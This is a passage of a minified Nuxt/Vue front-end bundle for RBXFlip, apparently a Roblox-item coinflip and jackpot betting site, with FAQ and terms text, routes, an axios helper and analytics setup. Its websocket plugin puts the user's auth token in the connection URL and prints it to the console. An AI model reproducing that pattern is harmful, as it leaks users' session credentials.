                            answer: "Projected items are items in which someone purchases typically a low demand cheap item for an extremely high price, temporarily raising its RAP to an inflated false amount. We disable betting projected items as it's unfair to users that they're risking their real value items, against an inflated fake RAP item. Projected's are only an issue with unvalued items as we use Roblox's RAP metric to gauge their worth."
                        }]
                    }
                }
            },
            St = (r(386), Object(C.a)(Ot, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ModalContainer", [r("h1", {
                    staticClass: "faq__title"
                }, [t._v("Frequently Asked Questions")]), t._v(" "), r("ul", {
                    staticClass: "faq__list"
                }, t._l(t.faqs, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("div", {
                        staticClass: "item__question"
                    }, [t._v(t._s(e.question))]), t._v(" "), e.answer ? r("div", {
                        staticClass: "item__answer"
                    }, [t._v(t._s(e.answer))]) : t._e(), t._v(" "), e.bullets ? r("ul", {
                        staticClass: "item__bullets"
                    }, t._l(e.bullets, (function(e, n) {
                        return r("li", {
                            key: i + "-" + n,
                            staticClass: "bullet"
                        }, [r("div", [t._v(t._s(e))])])
                    })), 0) : t._e()])
                })), 0)])
            }), [], !1, null, "e61db20a", null)),
            Rt = St.exports;
        installComponents(St, {
            ModalContainer: r(60).default
        });
        var It = {
                data: function() {
                    return {
                        agreement: "By accessing the website at https://www.rbxfilp.com (referred to here as Ã¢â‚¬Å“RBXFlipÃ¢â‚¬Â), you are agreeing to be bound by these terms of service, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws. If you do not agree with any of these terms, you are prohibited from using or accessing this site. The materials contained in this website are protected by applicable copyright and trademark law.",
                        terms: [{
                            title: "Bet Participation",
                            info: 'By placing a bet on RBXFlip you are 18 years of age or over, of sound mind capable of taking responsibility for your own actions. RBXFlip comes with no guarantees, expressed or implied, in connection with the service which is provided to you "as is" and we provide you with no warranty whatsoever regarding its quality, completeness or accuracy. As such, RBXFlip cannot be held responsible in any event, direct, indirect or consequential with the use of the website. RBXFlip reserves the right to suspend and/or cancel any bet/wager at any time. When a platform is suspended, any bets entered will be on hold. RBXFlip also reserves the right to cease betting at any time without notice. RBXFlip is not responsible for any trade limit errors ROBLOX limits the user to.'
                        }, {
                            title: "Affiliation",
                            info: "RBXFlip is not affiliated with Roblox or any trademarks of the Roblox Corporation."
                        }, {
                            title: "Item Values",
                            info: "Item values are constantly fluctuating and they may be updated at any time without any warning or notice. We are not responsible for changes or modifications to values of items."
                        }]
                    }
                }
            },
            Et = (r(388), Object(C.a)(It, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ModalContainer", [r("h1", {
                    staticClass: "tos__title"
                }, [t._v("Terms of Service & Agreement")]), t._v(" "), r("ul", {
                    staticClass: "tos__list"
                }, [r("li", {
                    staticClass: "list__item"
                }, [r("div", [t._v(t._s(t.agreement))])]), t._v(" "), t._l(t.terms, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("div", {
                        staticClass: "item__title"
                    }, [t._v(t._s(e.title))]), t._v(" "), r("div", {
                        staticClass: "item__info"
                    }, [t._v(t._s(e.info))])])
                }))], 2)])
            }), [], !1, null, "024d90b0", null)),
            Pt = Et.exports;
        installComponents(Et, {
            ModalContainer: r(60).default
        });
        var Tt = [
            ["/login", "login", F],
            ["/bet", "bet", W],
            ["/deposit", "deposit", G],
            ["/claims", "userClaims", H],
            ["/exchange", "exchange", at],
            ["/profiles/:userId", "profile", Z],
            ["/jackpot/history/:userId", "userJackpotHistory", ot],
            ["/coinflips/history/:userId", "userCoinflipHistory", lt],
            ["/coinflips/active/:coinflipId", "activeCoinflip", ht],
            ["/coinflips/inactive/:coinflipId", "inactiveCoinflip", gt],
            ["/stats", "stats", xt],
            ["/topten", "leaderboard", Ct],
            ["/history", "coinflipHistory", $t],
            ["/faq", "faq", Rt],
            ["/tos", "tos", Pt]
        ];
        c.default.use(y.a);

        function Nt(t) {
            return new y.a({
                mode: "history",
                routes: [{
                    path: "",
                    component: T,
                    meta: {
                        modalShowing: !1
                    },
                    children: [{
                        path: "/",
                        alias: "/coinflips",
                        component: T,
                        meta: {
                            currentPage: "coinflips",
                            modalShowing: !1
                        }
                    }, {
                        path: "/jackpot",
                        component: T,
                        meta: {
                            currentPage: "jackpot",
                            modalShowing: !1
                        }
                    }].concat(Object(v.a)(Tt.map((function(t) {
                        var e = Object(_.a)(t, 3),
                            path = e[0],
                            r = e[1],
                            n = e[2];
                        return {
                            path: path,
                            name: r,
                            components: {
                                default: T,
                                modal: n
                            },
                            meta: {
                                modalShowing: !0
                            }
                        }
                    }))))
                }, {
                    path: "/admin",
                    component: D
                }]
            })
        }
        var Ut = {
                name: "NuxtChild",
                functional: !0,
                props: {
                    nuxtChildKey: {
                        type: String,
                        default: ""
                    },
                    keepAlive: Boolean,
                    keepAliveProps: {
                        type: Object,
                        default: void 0
                    }
                },
                render: function(t, e) {
                    var r = e.parent,
                        data = e.data,
                        n = e.props,
                        o = r.$createElement;
                    data.nuxtChild = !0;
                    for (var c = r, l = r.$nuxt.nuxt.transitions, d = r.$nuxt.nuxt.defaultTransition, f = 0; r;) r.$vnode && r.$vnode.data.nuxtChild && f++, r = r.$parent;
                    data.nuxtChildDepth = f;
                    var m = l[f] || d,
                        h = {};
                    Dt.forEach((function(t) {
                        void 0 !== m[t] && (h[t] = m[t])
                    }));
                    var _ = {};
                    Lt.forEach((function(t) {
                        "function" == typeof m[t] && (_[t] = m[t].bind(c))
                    }));
                    var v = _.beforeEnter;
                    if (_.beforeEnter = function(t) {
                            if (window.$nuxt.$nextTick((function() {
                                    window.$nuxt.$emit("triggerScroll")
                                })), v) return v.call(c, t)
                        }, !1 === m.css) {
                        var y = _.leave;
                        (!y || y.length < 2) && (_.leave = function(t, e) {
                            y && y.call(c, t), c.$nextTick(e)
                        })
                    }
                    var x = o("routerView", data);
                    return n.keepAlive && (x = o("keep-alive", {
                        props: n.keepAliveProps
                    }, [x])), o("transition", {
                        props: h,
                        on: _
                    }, [x])
                }
            },
            Dt = ["name", "mode", "appear", "css", "type", "duration", "enterClass", "leaveClass", "appearClass", "enterActiveClass", "enterActiveClass", "leaveActiveClass", "appearActiveClass", "enterToClass", "leaveToClass", "appearToClass"],
            Lt = ["beforeEnter", "enter", "afterEnter", "enterCancelled", "beforeLeave", "leave", "afterLeave", "leaveCancelled", "beforeAppear", "appear", "afterAppear", "appearCancelled"],
            Mt = {
                name: "NuxtError",
                props: {
                    error: {
                        type: Object,
                        default: null
                    }
                },
                computed: {
                    statusCode: function() {
                        return this.error && this.error.statusCode || 500
                    },
                    message: function() {
                        return this.error.message || "Error"
                    }
                },
                head: function() {
                    return {
                        title: this.message,
                        meta: [{
                            name: "viewport",
                            content: "width=device-width,initial-scale=1.0,minimum-scale=1.0"
                        }]
                    }
                }
            },
            Ft = (r(390), Object(C.a)(Mt, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "__nuxt-error-page"
                }, [r("div", {
                    staticClass: "error"
                }, [r("svg", {
                    attrs: {
                        xmlns: "http://www.w3.org/2000/svg",
                        width: "90",
                        height: "90",
                        fill: "#DBE1EC",
                        viewBox: "0 0 48 48"
                    }
                }, [r("path", {
                    attrs: {
                        d: "M22 30h4v4h-4zm0-16h4v12h-4zm1.99-10C12.94 4 4 12.95 4 24s8.94 20 19.99 20S44 35.05 44 24 35.04 4 23.99 4zM24 40c-8.84 0-16-7.16-16-16S15.16 8 24 8s16 7.16 16 16-7.16 16-16 16z"
                    }
                })]), t._v(" "), r("div", {
                    staticClass: "title"
                }, [t._v(t._s(t.message))]), t._v(" "), 404 === t.statusCode ? r("p", {
                    staticClass: "description"
                }, [r("NuxtLink", {
                    staticClass: "error-link",
                    attrs: {
                        to: "/"
                    }
                }, [t._v("Back to the home page")])], 1) : t._e(), t._v(" "), t._m(0)])])
            }), [function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "logo"
                }, [e("a", {
                    attrs: {
                        href: "https://nuxtjs.org",
                        target: "_blank",
                        rel: "noopener"
                    }
                }, [this._v("Nuxt.js")])])
            }], !1, null, null, null).exports),
            Vt = (r(42), r(5)),
            zt = {
                name: "Nuxt",
                components: {
                    NuxtChild: Ut,
                    NuxtError: Ft
                },
                props: {
                    nuxtChildKey: {
                        type: String,
                        default: void 0
                    },
                    keepAlive: Boolean,
                    keepAliveProps: {
                        type: Object,
                        default: void 0
                    },
                    name: {
                        type: String,
                        default: "default"
                    }
                },
                errorCaptured: function(t) {
                    this.displayingNuxtError && (this.errorFromNuxtError = t, this.$forceUpdate())
                },
                computed: {
                    routerViewKey: function() {
                        if (void 0 !== this.nuxtChildKey || this.$route.matched.length > 1) return this.nuxtChildKey || Object(Vt.c)(this.$route.matched[0].path)(this.$route.params);
                        var t = Object(_.a)(this.$route.matched, 1)[0];
                        if (!t) return this.$route.path;
                        var e = t.components.default;
                        if (e && e.options) {
                            var r = e.options;
                            if (r.key) return "function" == typeof r.key ? r.key(this.$route) : r.key
                        }
                        return /\/$/.test(t.path) ? this.$route.path : this.$route.path.replace(/\/$/, "")
                    }
                },
                beforeCreate: function() {
                    c.default.util.defineReactive(this, "nuxt", this.$root.$options.nuxt)
                },
                render: function(t) {
                    var e = this;
                    return this.nuxt.err ? this.errorFromNuxtError ? (this.$nextTick((function() {
                        return e.errorFromNuxtError = !1
                    })), t("div", {}, [t("h2", "An error occurred while showing the error page"), t("p", "Unfortunately an error occurred and while showing the error page another error occurred"), t("p", "Error details: ".concat(this.errorFromNuxtError.toString())), t("nuxt-link", {
                        props: {
                            to: "/"
                        }
                    }, "Go back to home")])) : (this.displayingNuxtError = !0, this.$nextTick((function() {
                        return e.displayingNuxtError = !1
                    })), t(Ft, {
                        props: {
                            error: this.nuxt.err
                        }
                    })) : t("NuxtChild", {
                        key: this.routerViewKey,
                        props: this.$props
                    })
                }
            },
            qt = (r(55), r(56), r(57), r(41), r(48), r(58), {
                name: "NuxtLoading",
                data: function() {
                    return {
                        percent: 0,
                        show: !1,
                        canSucceed: !0,
                        reversed: !1,
                        skipTimerCount: 0,
                        rtl: !1,
                        throttle: 200,
                        duration: 5e3,
                        continuous: !1
                    }
                },
                computed: {
                    left: function() {
                        return !(!this.continuous && !this.rtl) && (this.rtl ? this.reversed ? "0px" : "auto" : this.reversed ? "auto" : "0px")
                    }
                },
                beforeDestroy: function() {
                    this.clear()
                },
                methods: {
                    clear: function() {
                        clearInterval(this._timer), clearTimeout(this._throttle), this._timer = null
                    },
                    start: function() {
                        var t = this;
                        return this.clear(), this.percent = 0, this.reversed = !1, this.skipTimerCount = 0, this.canSucceed = !0, this.throttle ? this._throttle = setTimeout((function() {
                            return t.startTimer()
                        }), this.throttle) : this.startTimer(), this
                    },
                    set: function(t) {
                        return this.show = !0, this.canSucceed = !0, this.percent = Math.min(100, Math.max(0, Math.floor(t))), this
                    },
                    get: function() {
                        return this.percent
                    },
                    increase: function(t) {
                        return this.percent = Math.min(100, Math.floor(this.percent + t)), this
                    },
                    decrease: function(t) {
                        return this.percent = Math.max(0, Math.floor(this.percent - t)), this
                    },
                    pause: function() {
                        return clearInterval(this._timer), this
                    },
                    resume: function() {
                        return this.startTimer(), this
                    },
                    finish: function() {
                        return this.percent = this.reversed ? 0 : 100, this.hide(), this
                    },
                    hide: function() {
                        var t = this;
                        return this.clear(), setTimeout((function() {
                            t.show = !1, t.$nextTick((function() {
                                t.percent = 0, t.reversed = !1
                            }))
                        }), 500), this
                    },
                    fail: function(t) {
                        return this.canSucceed = !1, this
                    },
                    startTimer: function() {
                        var t = this;
                        this.show || (this.show = !0), void 0 === this._cut && (this._cut = 1e4 / Math.floor(this.duration)), this._timer = setInterval((function() {
                            t.skipTimerCount > 0 ? t.skipTimerCount-- : (t.reversed ? t.decrease(t._cut) : t.increase(t._cut), t.continuous && (t.percent >= 100 || t.percent <= 0) && (t.skipTimerCount = 1, t.reversed = !t.reversed))
                        }), 100)
                    }
                },
                render: function(t) {
                    var e = t(!1);
                    return this.show && (e = t("div", {
                        staticClass: "nuxt-progress",
                        class: {
                            "nuxt-progress-notransition": this.skipTimerCount > 0, "nuxt-progress-failed": !this.canSucceed
                        },
                        style: {
                            width: this.percent + "%",
                            left: this.left
                        }
                    })), e
                }
            }),
            Wt = (r(392), Object(C.a)(qt, void 0, void 0, !1, null, null, null).exports),
            Bt = (r(394), r(236), r(397), Object(C.a)({}, (function() {
                var t = this.$createElement;
                return (this._self._c || t)("Nuxt")
            }), [], !1, null, null, null).exports);

        function Jt(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return Gt(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return Gt(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, c = !0,
                l = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return c = t.done, t
                },
                e: function(t) {
                    l = !0, o = t
                },
                f: function() {
                    try {
                        c || null == r.return || r.return()
                    } finally {
                        if (l) throw o
                    }
                }
            }
        }

        function Gt(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }
        var Yt = {
                _default: Object(Vt.r)(Bt)
            },
            Kt = {
                render: function(t, e) {
                    var r = t("NuxtLoading", {
                            ref: "loading"
                        }),
                        n = t(this.layout || "nuxt"),
                        o = t("div", {
                            domProps: {
                                id: "__layout"
                            },
                            key: this.layoutName
                        }, [n]),
                        c = t("transition", {
                            props: {
                                name: "layout",
                                mode: "out-in"
                            },
                            on: {
                                beforeEnter: function(t) {
                                    window.$nuxt.$nextTick((function() {
                                        window.$nuxt.$emit("triggerScroll")
                                    }))
                                }
                            }
                        }, [o]);
                    return t("div", {
                        domProps: {
                            id: "__nuxt"
                        }
                    }, [r, c])
                },
                data: function() {
                    return {
                        isOnline: !0,
                        layout: null,
                        layoutName: "",
                        nbFetching: 0
                    }
                },
                beforeCreate: function() {
                    c.default.util.defineReactive(this, "nuxt", this.$options.nuxt)
                },
                created: function() {
                    c.default.prototype.$nuxt = this, window.$nuxt = this, this.refreshOnlineStatus(), window.addEventListener("online", this.refreshOnlineStatus), window.addEventListener("offline", this.refreshOnlineStatus), this.error = this.nuxt.error, this.context = this.$options.context
                },
                mounted: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    t.$loading = t.$refs.loading;
                                case 1:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                },
                watch: {
                    "nuxt.err": "errorChanged"
                },
                computed: {
                    isOffline: function() {
                        return !this.isOnline
                    },
                    isFetching: function() {
                        return this.nbFetching > 0
                    },
                    isPreview: function() {
                        return Boolean(this.$options.previewData)
                    }
                },
                methods: {
                    refreshOnlineStatus: function() {
                        void 0 === window.navigator.onLine ? this.isOnline = !0 : this.isOnline = window.navigator.onLine
                    },
                    refresh: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            var r, n;
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        if ((r = Object(Vt.h)(t.$route)).length) {
                                            e.next = 3;
                                            break
                                        }
                                        return e.abrupt("return");
                                    case 3:
                                        return t.$loading.start(), n = r.map((function(e) {
                                            var p = [];
                                            if (e.$options.fetch && e.$options.fetch.length && p.push(Object(Vt.p)(e.$options.fetch, t.context)), e.$fetch) p.push(e.$fetch());
                                            else {
                                                var r, n = Jt(Object(Vt.e)(e.$vnode.componentInstance));
                                                try {
                                                    for (n.s(); !(r = n.n()).done;) {
                                                        var component = r.value;
                                                        p.push(component.$fetch())
                                                    }
                                                } catch (t) {
                                                    n.e(t)
                                                } finally {
                                                    n.f()
                                                }
                                            }
                                            return e.$options.asyncData && p.push(Object(Vt.p)(e.$options.asyncData, t.context).then((function(t) {
                                                for (var r in t) c.default.set(e.$data, r, t[r])
                                            }))), Promise.all(p)
                                        })), e.prev = 5, e.next = 8, Promise.all(n);
                                    case 8:
                                        e.next = 15;
                                        break;
                                    case 10:
                                        e.prev = 10, e.t0 = e.catch(5), t.$loading.fail(e.t0), Object(Vt.k)(e.t0), t.error(e.t0);
                                    case 15:
                                        t.$loading.finish();
                                    case 16:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [5, 10]
                            ])
                        })))()
                    },
                    errorChanged: function() {
                        this.nuxt.err && this.$loading && (this.$loading.fail && this.$loading.fail(this.nuxt.err), this.$loading.finish && this.$loading.finish())
                    },
                    setLayout: function(t) {
                        return t && Yt["_" + t] || (t = "default"), this.layoutName = t, this.layout = Yt["_" + t], this.layout
                    },
                    loadLayout: function(t) {
                        return t && Yt["_" + t] || (t = "default"), Promise.resolve(Yt["_" + t])
                    }
                },
                components: {
                    NuxtLoading: Wt
                }
            };
        c.default.use(x.a);
        var Ht = {};
        (Ht = function(t, e) {
            if ((t = t.default || t).commit) throw new Error("[nuxt] ".concat(e, " should export a method that returns a Vuex instance."));
            return "function" != typeof t && (t = Object.assign({}, t)),
                function(t, e) {
                    if (t.state && "function" != typeof t.state) {
                        console.warn("'state' should be a method that returns an object in ".concat(e));
                        var r = Object.assign({}, t.state);
                        t = Object.assign({}, t, {
                            state: function() {
                                return r
                            }
                        })
                    }
                    return t
                }(t, e)
        }(r(399), "store/index.js")).modules = Ht.modules || {};
        var Xt = Ht instanceof Function ? Ht : function() {
            return new x.a.Store(Object.assign({
                strict: !1
            }, Ht))
        };
        var Qt = {};
        for (var Zt in Qt) c.default.component(Zt, Qt[Zt]);
        var te = r(86),
            ee = r.n(te),
            ae = r(254),
            re = r.n(ae);

        function ie(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return ne(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return ne(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, c = !0,
                l = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return c = t.done, t
                },
                e: function(t) {
                    l = !0, o = t
                },
                f: function() {
                    try {
                        c || null == r.return || r.return()
                    } finally {
                        if (l) throw o
                    }
                }
            }
        }

        function ne(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }
        for (var oe = {
                setBaseURL: function(t) {
                    this.defaults.baseURL = t
                },
                setHeader: function(t, e) {
                    var r, n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "common",
                        o = ie(Array.isArray(n) ? n : [n]);
                    try {
                        for (o.s(); !(r = o.n()).done;) {
                            var c = r.value;
                            if (!e) return void delete this.defaults.headers[c][t];
                            this.defaults.headers[c][t] = e
                        }
                    } catch (t) {
                        o.e(t)
                    } finally {
                        o.f()
                    }
                },
                setToken: function(t, e) {
                    var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "common",
                        n = t ? (e ? e + " " : "") + t : null;
                    this.setHeader("Authorization", n, r)
                },
                onRequest: function(t) {
                    this.interceptors.request.use((function(e) {
                        return t(e) || e
                    }))
                },
                onResponse: function(t) {
                    this.interceptors.response.use((function(e) {
                        return t(e) || e
                    }))
                },
                onRequestError: function(t) {
                    this.interceptors.request.use(void 0, (function(e) {
                        return t(e) || Promise.reject(e)
                    }))
                },
                onResponseError: function(t) {
                    this.interceptors.response.use(void 0, (function(e) {
                        return t(e) || Promise.reject(e)
                    }))
                },
                onError: function(t) {
                    this.onRequestError(t), this.onResponseError(t)
                },
                create: function(t) {
                    return ue(re()(t, this.defaults))
                }
            }, se = function() {
                var t = le[ce];
                oe["$" + t] = function() {
                    return this[t].apply(this, arguments).then((function(t) {
                        return t && t.data
                    }))
                }
            }, ce = 0, le = ["request", "delete", "get", "head", "options", "post", "put", "patch"]; ce < le.length; ce++) se();
        var ue = function(t) {
                var e = ee.a.create(t);
                return e.CancelToken = ee.a.CancelToken, e.isCancel = ee.a.isCancel,
                    function(t) {
                        for (var e in oe) t[e] = oe[e].bind(t)
                    }(e), de(e), e
            },
            de = function(t) {
                var e = {
                        finish: function() {},
                        start: function() {},
                        fail: function() {},
                        set: function() {}
                    },
                    r = function() {
                        var t = "undefined" != typeof window && window.$nuxt;
                        return t && t.$loading && t.$loading.set ? t.$loading : e
                    },
                    n = 0;
                t.onRequest((function(t) {
                    t && !1 === t.progress || n++
                })), t.onResponse((function(t) {
                    t && t.config && !1 === t.config.progress || --n <= 0 && (n = 0, r().finish())
                })), t.onError((function(t) {
                    t && t.config && !1 === t.config.progress || (n--, ee.a.isCancel(t) || (r().fail(), r().finish()))
                }));
                var o = function(t) {
                    if (n) {
                        var progress = 100 * t.loaded / (t.total * n);
                        r().set(Math.min(100, progress))
                    }
                };
                t.defaults.onUploadProgress = o, t.defaults.onDownloadProgress = o
            },
            pe = function(t, e) {
                var r = t.$config && t.$config.axios || {},
                    n = r.browserBaseURL || r.baseURL || "";
                var o = ue({
                    baseURL: n,
                    headers: {
                        common: {
                            Accept: "application/json, text/plain, */*"
                        },
                        delete: {},
                        get: {},
                        head: {},
                        post: {},
                        put: {},
                        patch: {}
                    }
                });
                t.$axios = o, e("axios", o)
            },
            fe = r(255),
            me = r.n(fe);

        function he(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function _e(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? he(Object(source), !0).forEach((function(e) {
                    Object(o.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : he(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }
        var ve = function() {
                var t = Object(n.a)(regeneratorRuntime.mark((function t(e, r) {
                    var n, o;
                    return regeneratorRuntime.wrap((function(t) {
                        for (;;) switch (t.prev = t.next) {
                            case 0:
                                if (n = e.$config && e.$config.googleAnalytics || {}, "function" != typeof(o = _e(_e({}, {
                                        dev: !0,
                                        debug: {
                                            sendHitTask: !0
                                        },
                                        id: "UA-135551128-1"
                                    }), n)).asyncID) {
                                    t.next = 7;
                                    break
                                }
                                return t.next = 6, o.asyncID(e);
                            case 6:
                                o.id = t.sent;
                            case 7:
                                c.default.use(me.a, _e(_e({}, {
                                    router: e.app.router
                                }), o)), e.$ga = c.default.$ga, r("ga", c.default.$ga);
                            case 10:
                            case "end":
                                return t.stop()
                        }
                    }), t)
                })));
                return function(e, r) {
                    return t.apply(this, arguments)
                }
            }(),
            ge = r(45),
            be = r(154),
            ye = r(7),
            xe = r(189);
        ge.c.add(ye.u, ye.s, ye.c, ye.t, ye.A, ye.z, ye.g, ye.j, ye.v, ye.i, ye.m, ye.y, ye.h, ye.o, ye.q, ye.l, ye.n, ye.r, ye.k, ye.p, ye.d, ye.f, ye.w, ye.a, ye.e, ye.b, ye.x, xe.a, xe.b), ge.a.autoAddCss = !1, c.default.component("FontAwesomeIcon", be.a), c.default.component("FontAwesomeLayers", be.b), c.default.component("FontAwesomeLayersText", be.c);
        r(417);
        c.default.prototype.$util = {
            getUserThumbnail: function(t) {
                switch (t) {
                    case -1:
                        return "/img/pfps/ly.png";
                    case -2:
                        return "/img/pfps/st.png";
                    case -3:
                        return "/img/pfps/pd.png";
                    default:
                        return "https://www.roblox.com/headshot-thumbnail/image?userId=".concat(t, "&height=110&width=110&format=png")
                }
            },
            getAssetThumbnail: function(t) {
                return "https://www.roblox.com/asset-thumbnail/image?width=420&height=420&format=png&assetId=".concat(t)
            },
            getRandomSpriteSheet: function(option) {
                var t = "peak_".concat(["heads", "tails"][Math.floor(2 * Math.random())]),
                    e = "land_".concat(option.toLowerCase()),
                    r = "".concat(t, "_").concat(e, ".png");
                return "/img/spritesheets/".concat(r)
            },
            parseRGBA: function(t) {
                var e = t.red,
                    r = t.green,
                    n = t.blue,
                    o = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1;
                return "rgba(".concat(e, ", ").concat(r, ", ").concat(n, ", ").concat(o, ")")
            },
            toLongNumber: function(t) {
                return t.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            },
            toShortNumber: function(t) {
                var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 2,
                    r = ["K", "M", "B", "T"];
                t = Math.abs(t), e = Math.pow(10, e);
                for (var i = r.length - 1; i >= 0; i--) {
                    var n = Math.pow(10, 3 * (i + 1));
                    if (n <= t) {
                        1e3 == (t = Math.round(t * e / n) / e) && i < r.length - 1 && (t = 1, i++), t += r[i];
                        break
                    }
                }
                return String(t)
            },
            toUSD: function() {}
        }, c.default.filter("longNumber", c.default.prototype.$util.toLongNumber), c.default.filter("shortNumber", c.default.prototype.$util.toShortNumber), c.default.filter("smallDecimal", (function(t) {
            return t.toFixed(2)
        }));
        var we = r(256),
            ke = r.n(we),
            Ce = function(t) {
                var e = t.env.WS_URL_BROWSER,
                    r = t.store,
                    n = e,
                    o = localStorage.getItem("auth._token.local");
                o && "false" != o && (n += "?authorization=".concat(o), console.log("Authorized connection:", n)), c.default.use(ke.a, n, {
                    format: "json",
                    reconnection: !0,
                    reconnectionAttempts: 1 / 0,
                    reconnectionDelay: 5e3,
                    store: r
                })
            },
            Ae = function(t) {
                return t.store.dispatch("nuxtClientInit", t)
            },
            je = r(257),
            $e = r.n(je);
        c.default.use($e.a);
        var Oe = r(258),
            Se = r.n(Oe);
        r(419);
        c.default.use(Se.a, {
            position: "top"
        });
        var Re = r(259);
        c.default.use(Re.a);
        var Ie = r(191),
            Ee = r.n(Ie);
        c.default.component(Ee.a.name, Ee.a);
        r(40), r(43);
        var Pe = r(62),
            Te = r(70),
            Ne = r(71),
            Ue = r(192),
            De = (r(180), r(209), r(421), r(422), r(229), function(t) {
                return null == t
            }),
            Le = function(t) {
                return !De(t)
            },
            Me = function(a, b) {
                return a.split("?")[0].replace(/\/+$/, "") === b.split("?")[0].replace(/\/+$/, "")
            },
            Fe = function(u) {
                return u && u.length && /^\/([a-zA-Z0-9@\-%_~][/a-zA-Z0-9@\-%_~]*)?([?][^#]*)?(#[^#]*)?$/.test(u)
            },
            Ve = function(t, e, r) {
                return t.matched.some((function(t) {
                    return Object.values(t.components).some((function(component) {
                        return component.options && component.options[e] === r
                    }))
                }))
            };

        function ze() {
            var path = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
                t = path.split("?")[0];
            return "/" === t.charAt(t.length - 1) && (t = t.slice(0, -1)), t
        }

        function qe(t) {
            return "string" == typeof t ? t : JSON.stringify(t)
        }

        function We(t) {
            if ("string" == typeof t) try {
                return JSON.parse(t)
            } catch (t) {}
            return t
        }

        var Je = function() {
            function t(e, r) {
                Object(Te.a)(this, t), this.ctx = e, this.options = r, this._initState()
            }
            return Object(Ne.a)(t, [{
                key: "setUniversal",
                value: function(t, e) {
                    return De(e) ? this.removeUniversal(t) : (this.setState(t, e), this.setCookie(t, e), this.setLocalStorage(t, e), e)
                }
            }, {
                key: "getUniversal",
                value: function(t) {
                    var e = this.getState(t);
                    return De(e) && (e = this.getCookie(t)), De(e) && (e = this.getLocalStorage(t)), e
                }
            }, {
                key: "syncUniversal",
                value: function(t, e) {
                    var r = this.getUniversal(t);
                    return De(r) && Le(e) && (r = e), Le(r) && this.setUniversal(t, r), r
                }
            }, {
                key: "removeUniversal",
                value: function(t) {
                    this.removeState(t), this.removeLocalStorage(t), this.removeCookie(t)
                }
            }, {
                key: "_initState",
                value: function() {
                    var t = this;
                    if (c.default.set(this, "_state", {}), this._useVuex = this.options.vuex && this.ctx.store, this._useVuex) {
                        var e = {
                            namespaced: !0,
                            state: function() {
                                return t.options.initialState
                            },
                            mutations: {
                                SET: function(t, e) {
                                    c.default.set(t, e.key, e.value)
                                }
                            }
                        };
                        this.ctx.store.registerModule(this.options.vuex.namespace, e, {
